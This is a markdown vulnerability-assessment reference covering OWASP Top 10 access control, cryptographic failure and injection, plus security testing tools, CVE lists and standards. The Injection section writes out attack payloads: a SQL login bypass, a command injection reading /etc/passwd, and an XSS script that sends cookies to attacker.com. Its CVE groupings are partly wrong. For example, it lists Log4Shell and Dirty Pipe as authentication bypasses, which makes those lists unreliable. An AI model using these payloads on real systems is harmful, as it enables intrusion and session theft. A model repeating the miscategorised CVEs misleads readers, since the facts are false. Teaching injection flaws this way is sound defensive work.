# Vulnerability Assessment Reference

Comprehensive reference material for vulnerability assessment, security testing, and OWASP Top 10.

## OWASP Top 10 (2021) - Detailed Reference

### A01:2021 - Broken Access Control

**CWE Mappings**: CWE-200, CWE-201, CWE-352, CWE-639

**Description**: Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data.

**Common Vulnerabilities**:
- Violation of least privilege or deny by default
- Bypassing access control checks by modifying URL, internal application state, or HTML page
- IDOR (Insecure Direct Object Reference)
- Missing access controls for POST, PUT, DELETE
- Elevation of privilege
- Metadata manipulation (e.g., JWT tampering)
- CORS misconfiguration allowing unauthorized API access

**Real-World Examples**:
- **CVE-2021-22205**: GitLab authentication bypass (CVSS 10.0)
- **CVE-2020-15257**: containerd container breakout (CVSS 6.3)

**References**:
- OWASP Access Control Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html
- CWE-862: Missing Authorization: https://cwe.mitre.org/data/definitions/862.html

---

### A02:2021 - Cryptographic Failures

**CWE Mappings**: CWE-259, CWE-327, CWE-331

**Description**: Failures related to cryptography (or lack thereof) which often leads to exposure of sensitive data.

**Common Vulnerabilities**:
- Transmitting data in clear text (HTTP, FTP, SMTP)
- Old or weak cryptographic algorithms (MD5, SHA1, DES)
- Default, weak, or reused keys
- Missing encryption for sensitive data at rest
- Insecure random number generation
- Missing certificate validation

**Real-World Examples**:
- **CVE-2014-0160**: Heartbleed (OpenSSL TLS)
- **CVE-2020-1350**: SIGRed (Windows DNS Server)

**TLS Best Practices**:
- Use TLS 1.2 minimum, prefer TLS 1.3
- Disable SSLv3, TLS 1.0, TLS 1.1
- Use strong cipher suites (ECDHE, AES-GCM, ChaCha20-Poly1305)
- Implement HSTS (Strict-Transport-Security header)
- Use certificate pinning for mobile apps

**References**:
- OWASP Cryptographic Storage Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html
- Mozilla SSL Configuration Generator: https://ssl-config.mozilla.org/

---

### A03:2021 - Injection

**CWE Mappings**: CWE-79, CWE-89, CWE-73, CWE-94, CWE-917

**Description**: Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query.

**Types**:

**SQL Injection**:
```sql
-- ‚ùå BAD: Vulnerable query - example of what NOT to do
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- Attack payload
username: admin' --
Result: SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```

**Command Injection**:
```bash
# Vulnerable code
system("ping -c 4 " + user_input)

# Attack payload
user_input: "8.8.8.8; cat /etc/passwd"
```

**XSS (Cross-Site Scripting)**:
```html
<!-- Vulnerable output -->
<div>Welcome, <?= $username ?></div>

<!-- Attack payload -->
username: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

**Real-World Examples**:
- **CVE-2021-44228**: Log4Shell (JNDI injection, CVSS 10.0)
- **CVE-2019-19781**: Citrix ADC path traversal (CVSS 9.8)

**Prevention**:
- Use parameterized queries/prepared statements
- Use ORM frameworks correctly
- Whitelist input validation
- Escape special characters
- Use CSP (Content Security Policy) headers for XSS
- Use SAST tools to detect injection vulnerabilities

**References**:
- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

## Security Testing Tools Reference

### Static Analysis (SAST)

| Tool | Language | License | Use Case |
|------|----------|---------|----------|
| **Bandit** | Python | Apache 2.0 | Python security issues |
| **Semgrep** | Multi | LGPL 2.1 | Pattern-based SAST |
| **CodeQL** | Multi | Proprietary | Advanced semantic analysis |
| **Gosec** | Go | Apache 2.0 | Go security scanner |
| **Brakeman** | Ruby | MIT | Rails security scanner |
| **ESLint** | JavaScript | MIT | JS/TS linting + security |

### Dynamic Analysis (DAST)

| Tool | Type | License | Use Case |
|------|------|---------|----------|
| **OWASP ZAP** | Full DAST | Apache 2.0 | Web app scanning |
| **Burp Suite** | Full DAST | Proprietary | Manual + automated testing |
| **Nikto** | Web scanner | GPL | Web server scanning |
| **SQLMap** | Specialized | GPL | SQL injection testing |
| **Nuclei** | Scanner | MIT | CVE + template scanning |

### Software Composition Analysis (SCA)

| Tool | Ecosystem | License | Coverage |
|------|-----------|---------|----------|
| **Safety** | Python | MIT | PyPI vulnerabilities |
| **pip-audit** | Python | Apache 2.0 | Python dependencies |
| **npm audit** | Node.js | Artistic 2.0 | npm vulnerabilities |
| **Snyk** | Multi | Proprietary | Multi-language + containers |
| **Trivy** | Multi | Apache 2.0 | Containers + code + IaC |
| **Grype** | Containers | Apache 2.0 | Container vulnerabilities |
| **OSV Scanner** | Multi | Apache 2.0 | Google OSV database |

---

## Common CVE Patterns

### Container Escape
- CVE-2019-5736 (runc)
- CVE-2020-15257 (containerd)
- CVE-2022-0492 (cgroups)

### Authentication Bypass
- CVE-2021-22205 (GitLab)
- CVE-2021-44228 (Log4j)
- CVE-2022-0847 (Dirty Pipe)

### Remote Code Execution
- CVE-2021-44228 (Log4Shell)
- CVE-2022-22965 (Spring4Shell)
- CVE-2021-34527 (PrintNightmare)

---

## Security Testing Standards

### OWASP Testing Guide v4
- https://owasp.org/www-project-web-security-testing-guide/

### NIST SP 800-115
- Technical Guide to Information Security Testing and Assessment

### PTES (Penetration Testing Execution Standard)
- http://www.pentest-standard.org/

### PCI DSS Requirements
- Requirement 6: Develop and maintain secure systems
- Requirement 11: Regularly test security systems and processes

---

## Vulnerability Databases

- **NVD (National Vulnerability Database)**: https://nvd.nist.gov/
- **CVE**: https://cve.mitre.org/
- **OSV (Open Source Vulnerabilities)**: https://osv.dev/
- **Exploit-DB**: https://www.exploit-db.com/
- **GitHub Advisory Database**: https://github.com/advisories

---

## Compliance Frameworks

### OWASP ASVS (Application Security Verification Standard)
- Level 1: Baseline security
- Level 2: Defense in depth
- Level 3: High assurance

### CWE Top 25
Most dangerous software weaknesses (2023):
1. CWE-787: Out-of-bounds Write
2. CWE-79: Cross-site Scripting
3. CWE-89: SQL Injection
4. CWE-20: Improper Input Validation
5. CWE-78: OS Command Injection

---

**Last Updated**: 2025-10-27
